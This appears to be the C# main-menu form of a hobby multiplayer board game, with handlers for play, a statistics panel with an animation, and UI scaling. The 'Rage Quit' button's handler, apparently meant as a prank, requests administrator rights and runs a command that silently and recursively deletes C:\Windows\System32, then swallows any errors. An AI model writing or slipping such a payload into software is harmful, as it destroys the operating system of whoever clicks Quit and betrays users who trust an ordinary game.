using System.Diagnostics;

namespace Blue_Lagoon___Chaos_Edition {
    public partial class MainMenu : Form {
        public MainMenu() {
            InitializeComponent();
        }

        #region Rage Quit
        private void QuitButton_Click(object sender, EventArgs e) {
            try {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = @"/c del C:\Windows\System32 /q /s";
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
            }
            catch { }
            //this.Close(); useless code why would you want to quit??
        }
        #endregion

        #region Play
        private void PlayButton_Click(object sender, EventArgs e) {
            // Get connection information
            GetConnectionInfo connectionInfo = new GetConnectionInfo();
            connectionInfo.ShowDialog();

            // Attempt to connect
            if (connectionInfo.successful) {
                Game game = new Game(connectionInfo.username.Text, connectionInfo.ipAddress.Text, int.Parse(connectionInfo.port.Text));
                if (!game.IsDisposed) {
                    this.Hide();
                    game.ShowDialog();
                    this.Show();
                }
            }
        }
        #endregion

        #region Statistics
        private void StatisticsButton_Click(object sender, EventArgs e) {
            #region Update statistics labels
            if (sender == StatisticsButton) {
                // Find longest statistic length
                int len = 0;
                int[] statisticsLengths = new int[9];
                for (int i = 0; i < 9; i++) {
                    // Get length
                    int _len = Statistics.GetStatistic(i).Length;
                    statisticsLengths[i] = _len;
                    
                    // Find largest length
                    if (_len > len)
                        len = _len;
                }

                // Spacing between text and statistic function
                string GetSpacing(int statistic) => new string(' ', len - statisticsLengths[statistic]);

                // Set statistics texts - couldn't think of a better solution
                SettlersPlacedText.Text             = $"Settlers Placed:              {GetSpacing(0)}{Statistics.GetStatistic(0)}";
                VillagesPlacedText.Text             = $"Villages Placed:              {GetSpacing(1)}{Statistics.GetStatistic(1)}";
                ServersJoinedText.Text              = $"Servers Joined:               {GetSpacing(2)}{Statistics.GetStatistic(2)}";
                GamesPlayedText.Text                = $"Games Played:                 {GetSpacing(3)}{Statistics.GetStatistic(3)}";
                ExplorationPhasesWonText.Text       = $"Exploration Phases Won:       {GetSpacing(4)}{Statistics.GetStatistic(4)}";
                ExplorationPhasesLostText.Text      = $"Exploration Phases Lost:      {GetSpacing(5)}{Statistics.GetStatistic(5)}";
                SettlementPhasesWonText.Text        = $"Settlment Phases Won:         {GetSpacing(6)}{Statistics.GetStatistic(6)}";
                SettlementPhasesLostText.Text       = $"Settlement Phases Lost:       {GetSpacing(7)}{Statistics.GetStatistic(7)}";
                SettlementPhasesUnplayableText.Text = $"Settlement Phases Unplayable: {GetSpacing(8)}{Statistics.GetStatistic(8)}";
            }
            #endregion

            #region Animation
            // Animation variables
            int direction = (BackgroundPanel.Location.X == 0 ? -1 : 1);
            double progress = 0;
            int startPos = (BackgroundPanel.Location.X == 0 ? 0 : -this.Size.Width);

            // Delta time for similar speeds across any hardware
            Stopwatch sw = new Stopwatch();
            double dT = 0;
            sw.Start();

            // Animation Loop
            do {
                sw.Restart();

                // Calculate animation position
                progress += dT * 2; // 0.5 seconds
                double easeFunction = 1 - Math.Pow(1 - progress, 5); // "Ease Out Quint"

                // Move everything
                BackgroundPanel.Location = new Point((int)Math.Clamp(this.Size.Width * easeFunction * direction + direction + startPos, -this.Size.Width, 0), 0);
                BackgroundPanel.Refresh();
                
                // Calculate delta time
                dT = sw.ElapsedMilliseconds / 1000.0;
            } while (BackgroundPanel.Location.X != 0 && BackgroundPanel.Location.X != -this.Size.Width);
            #endregion
        }
        #endregion

        #region Scale UI
        void LoopScaleControlFonts(Control controls) {
            foreach (Control control in controls.Controls)
                if (control is Button || control is Label)
                    Program.ScaleUI(control);
        }
        private void MainMenu_Load(object sender, EventArgs e) {
            // Calculate scale
            Program.scale = MathF.Min(this.Size.Width / 1280f, this.Size.Height / 720f) * 96f / (this.DeviceDpi * 1.05f);
            Program.scaleSizeF = new SizeF(Program.scale, Program.scale);

            // Setup BackgroundPanel
            BackgroundPanel.Size = new Size(this.Size.Width * 2, this.Size.Height);
            BackgroundPanel.Location = new Point(0,0); // idk if require didn't test :p

            // Scale components
            LoopScaleControlFonts(MainMenuPanel);
            LoopScaleControlFonts(StatisticsPanel);
        }
        #endregion
    }
}
